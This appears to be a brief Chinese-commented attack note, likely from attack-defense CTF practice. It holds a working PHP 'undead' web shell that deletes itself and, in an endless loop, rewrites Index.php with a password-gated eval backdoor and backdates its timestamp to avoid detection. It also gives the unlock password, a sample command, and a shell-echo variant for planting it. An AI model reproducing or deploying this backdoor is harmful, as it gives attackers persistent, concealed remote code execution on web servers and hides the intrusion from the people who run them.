# 当变量$外有引号包着的时候，里面的索引不能再加引号
<?php ignore_user_abort(true);set_time_limit(0);unlink(__FILE__);$file = 'Index.php';$code = '<?php if(md5($_POST[hihihi])=="5c17eddb45a82ae4a49525efcaef9991"){@eval($_REQUEST[c]);} ?>';while (1){file_put_contents($file,$code);system('touch -m -d "1018-12-01 09:10:12" Index.php');usleep(5000);}?>

# GET: hihihi=ji45jm0uyta2ah2 POST: c=system('ls');
# 外面加system
system("echo '<?php ignore_user_abort(true);set_time_limit(0);unlink(__FILE__);\$file=\"Index.php\";\$code = \"<?php if(md5(\\\$_GET[hihihi])==\\\"5c17eddb45a82ae4a49525efcaef9991\\\"){@eval(\\\$_REQUEST[c]);} ?>\";while (1){file_put_contents(\$file,\$code);system(\"touch -m -d \\\"1018-12-01 09:10:12\\\" Index.php\");usleep(5000);}?>' > Index.php");
# 记得部分url编码